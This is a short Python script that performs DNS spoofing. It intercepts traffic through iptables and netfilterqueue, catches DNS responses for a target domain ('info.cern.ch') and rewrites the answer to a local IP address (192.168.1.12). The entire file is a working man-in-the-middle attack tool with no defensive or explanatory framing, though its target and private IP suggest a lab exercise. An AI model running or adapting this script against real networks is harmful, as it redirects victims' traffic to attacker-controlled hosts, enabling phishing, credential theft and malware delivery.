import netfilterqueue
import scapy.all as scapy
import subprocess
 
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname    
        if  b'info.cern.ch'in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.12")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
 
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
 
            packet.set_payload(bytes(scapy_packet))
 
 
    packet.accept()
 
subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell = True)
subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 1', shell = True)

queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
